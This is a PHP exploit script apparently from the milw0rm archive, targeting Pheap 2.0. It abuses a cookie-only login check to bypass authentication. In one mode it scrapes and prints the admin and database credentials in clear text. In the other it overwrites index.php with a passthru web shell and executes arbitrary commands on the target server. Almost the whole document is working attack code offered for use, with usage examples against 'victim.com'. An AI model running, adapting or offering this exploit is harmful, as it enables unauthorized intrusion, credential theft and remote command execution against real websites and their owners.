#!/usr/bin/php -q -d short_open_tag=on
<?php

/*

Explanation:

The user verification routine used in most of the files is:

#####
#
#   include("lib/config.php");
#	if ($_COOKIE['pheap_login'] != $username){
#	header("Location: login.php");
#	} else { [CONTINUE EXECUTING CODE] }
#
#####

So basically it's saying "If the value within the cookie pheap_login is not the same value
that is assigned to the $username variable withing lib/config.php then you have to be redirected
to the login page".

So if we know the admin's username we can access any page that uses this authentication method. Also, 
we can retrieve all credentials in clear-text. ;)

*/

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

if ($argc<5) {
print "-------------------------------------------------------------------------\r\n";
print "              Pheap 2.0 Admin Bypass/Remote Code Execution\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_pheap.php [OPTION] [HOST] [PATH] [USER] ([COMMAND])\r\n\r\n";
print "[OPTION]  = 0 = Credentials Disclosures\r\n";
print "            1 = Remote Code Execution\r\n";
print "[HOST] 	  = Target server's hostname or ip address\r\n";
print "[PATH] 	  = Path where Pheap is located\r\n";
print "[USER] 	  = Admin's username\r\n";
print "[COMMAND] = Command to execute\r\n\r\n";
print "e.g. w4ck1ng_pheap.php 0 victim.com /pheap/ admin\r\n";
print "     w4ck1ng_pheap.php 1 victim.com /pheap/ admin \"ls -lia\"\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
die;
}

// Props to rgod for the following functions

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$exploit = $argv[1];
$host = $argv[2];
$path = $argv[3];
$user = $argv[4];
$cmd  = $argv[5];
$cmd  = urlencode($cmd);
$port=80;$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

if ($exploit==0){

print "-------------------------------------------------------------------------\r\n";
print "              Pheap 2.0 Admin Bypass/Remote Code Execution\r\n";
print "-------------------------------------------------------------------------\r\n";

    $packet ="GET " . $path . "settings.php HTTP/1.1\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Cookie: pheap_login=" . $user . "\r\n";
    $packet.="Connection: Close\r\n\r\n";

    sendpacketii($packet);

    if (strstr($html,"This is the settings panel")){}
    else{echo "...Failed!\r\n"; exit();}

    $temp=explode("name=\"user_name\" class=\"ieleft\" value=\"",$html);
    $temp2=explode("\" /> <strong>:Username",$temp[1]);
    $ret_user=$temp2[0];

    echo "[+] Admin User: " . $ret_user . "\r\n";

    $temp=explode("name=\"password\" class=\"ieleft\" value=\"",$html);
    $temp2=explode("\" /> <strong>:Password",$temp[1]);
    $ret_user=$temp2[0];

    echo "[+] Admin Pass: " . $ret_user . "\r\n";

    $temp=explode("name=\"dbhost\" class=\"ieleft\" id=\"dbhost\" value=\"",$html);
    $temp2=explode("\" /> <strong>:Database Host",$temp[1]);
    $ret_user=$temp2[0];

    echo "[+] Database Host: " . $ret_user . "\r\n";

    $temp=explode("name=\"dbuser\" class=\"ieleft\" id=\"dbuser\" value=\"",$html);
    $temp2=explode("\" /> <strong>:Database Username",$temp[1]);
    $ret_user=$temp2[0];

    echo "[+] Database User: " . $ret_user . "\r\n";

    $temp=explode("name=\"dbpass\" class=\"ieleft\" id=\"dbpass\" value=\"",$html);
    $temp2=explode("\" /> <strong>:Database Password",$temp[1]);
    $ret_user=$temp2[0];

    echo "[+] Database Pass: " . $ret_user . "\r\n";

print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
}

if($exploit==1){

    $packet ="GET " . $path . "edit.php?em=file&filename=" . $path . "index.php HTTP/1.1\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Cookie: pheap_login=" . $user . "\r\n";
    $packet.="Connection: Close\r\n\r\n";

    sendpacketii($packet);

    $temp=explode("name=\"filename\" value=\"",$html);
    $temp2=explode("\">",$temp[1]);
    $fullpath=$temp2[0];

	$shell = '<?php echo "<font color=#FFFFFF>...Silentz</font>";ini_set("max_execution_time",0);passthru($_GET[cmd]);echo "<font color=#FFFFFF>...Silentz</font>";?>';
	$data = "mce_editor_0_styleSelect=";
	$data .= "&mce_editor_0_formatSelect=";
	$data .= "&mce_editor_0_fontNameSelect=";
	$data .= "&mce_editor_0_fontSizeSelect=0";
	$data .= "&mce_editor_0_zoomSelect=100%25";
	$data .= "&content=" . urlencode($shell);
	$data .= "&filename=" . urlencode($fullpath);
	$data .= "&update_text.x=57";
	$data .= "&update_text.y=15"; 

    $packet ="POST " . $path . "edit.php?action=update_doc HTTP/1.1\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    $packet.="Accept: */*\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Cookie: pheap_login=" . $user . "\r\n";
    $packet.="Referer: http://" . $host.$path . "edit.php?em=file&filename=" . $path . "index.php\r\n";
    $packet.="Connection: Close\r\n\r\n";
    $packet.=$data;
    sendpacketii($packet);

    $packet ="GET " . $path . "index.php?cmd=" . $cmd . " HTTP/1.1\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    sendpacketii($packet);

    if (strstr($html,"...Silentz"))
     {
	print "-------------------------------------------------------------------------\r\n";
	print "              Pheap 2.0 Admin Bypass/Remote Code Execution\r\n";
	print "-------------------------------------------------------------------------\r\n";

       $temp=explode("...Silentz</font>",$html);
       $temp2=explode("<font color=#FFFFFF>",$temp[1]);
       echo "===============================================================\r\n\r\n";
       echo $temp2[0];
       echo "\r\n===============================================================\r\n";
       echo "\r\n[+] Shell...http://" .$host.$path. "index.php?cmd=[COMMAND]\r\n";

	print "-------------------------------------------------------------------------\r\n";
	print "            		 http://www.w4ck1ng.com\r\n";
	print "            		        ...Silentz\r\n";
	print "-------------------------------------------------------------------------\r\n";

       die;
     }
}
?>

# milw0rm.com [2007-05-29]
